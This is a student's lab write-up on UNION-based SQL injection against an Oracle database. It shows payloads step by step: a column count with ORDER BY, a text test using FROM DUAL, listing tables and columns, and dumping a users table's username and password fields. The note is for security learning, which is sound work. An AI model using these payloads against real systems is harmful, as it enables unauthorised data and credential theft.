# Lab 06 – SQLi: Listing the database contents (Oracle)

Goal:
Enumerate tables/columns on Oracle and dump creds via UNION-based SQLi.

what i did:
- first I just threw a `'` in the category param (even though the lab already said it was vuln) i wanted to double check for myself.
- then I used `ORDER BY` to figure out how many columns:
  - `' ORDER BY 2-- ` → worked fine (200 OK)  
  - `' ORDER BY 3-- ` → broke (500 error)  
  so yeah, there are 2 columns

- next step: test if the columns accept text. since it’s Oracle, I had to add `FROM DUAL`: ' UNION SELECT 'abc','def' FROM DUAL-- both showed up fine
- time to list the tables. Oracle doesn’t have `information_schema`, it uses `all_tables`: ' UNION SELECT table_name, NULL FROM all_tables--
found the users table: **USERS_YCPBBU**.
- listed the columns from that table: ' UNION SELECT column_name, NULL
FROM all_tab_columns
WHERE table_name = 'USERS_YCPBBU'--
- saw **USERNAME_SSHVQL** and **PASSWORD_KUZCLN** : ' UNION SELECT USERNAME_SSHVQL, PASSWORD_KUZCLN
FROM USERS_YCPBBU--

Notes: 

oracle requires every SELECT to come from a table — even if you’re just selecting a literal string. there’s no such thing as “a query with no table.”
dual is basically a pretend table, everyone uses it to select constants, sysinfo, or functions, you need `FROM DUAL`, table/col names are UPPERCASE, and `--` needs a space.  
